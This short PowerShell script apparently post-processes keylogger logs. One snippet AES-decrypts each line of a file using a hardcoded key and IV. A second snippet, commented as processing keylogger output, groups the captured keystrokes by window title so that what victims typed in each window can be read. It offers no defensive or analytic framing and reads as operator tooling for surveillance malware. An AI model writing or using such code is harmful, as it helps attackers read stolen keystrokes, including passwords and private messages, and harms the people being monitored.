#Decrypt each line of file
$Key = [System.Text.Encoding]::UTF8.GetBytes("0123456789abcdef")
$IV = [System.Text.Encoding]::UTF8.GetBytes("0123456789abcdef")
$FilePath = "C:\path\to\file.txt"
$AES = New-Object System.Security.Cryptography.AesManaged
$AES.Key = $Key
$AES.IV = $IV
$Reader = New-Object System.IO.StreamReader($FilePath)
while (($Line = $Reader.ReadLine()) -ne $null) {
    $EncryptedBytes = [System.Convert]::FromBase64String($Line)
    $MemoryStream = New-Object System.IO.MemoryStream
    $Decryptor = $AES.CreateDecryptor()
    $CryptoStream = New-Object System.Security.Cryptography.CryptoStream($MemoryStream, $Decryptor, [System.Security.Cryptography.CryptoStreamMode]::Write)
    $CryptoStream.Write($EncryptedBytes, 0, $EncryptedBytes.Length)
    $CryptoStream.FlushFinalBlock()
    $DecryptedBytes = $MemoryStream.ToArray()
    [System.Text.Encoding]::UTF8.GetString($DecryptedBytes)
}

#Process keylogger output to combine keys in same window
$keystrokes = @{}
Get-Content -Path "path\to\file.txt" | ForEach-Object {
    $keystroke, $windowTitle, $time = $_.Split("`t")
    if ($keystrokes.ContainsKey($windowTitle)) {
        $keystrokes[$windowTitle] += $keystroke
    } else {
        $keystrokes[$windowTitle] = $keystroke
    }
}
$keystrokes.GetEnumerator() | ForEach-Object {
    Write-Host $_.Key
    Write-Host $_.Value
}
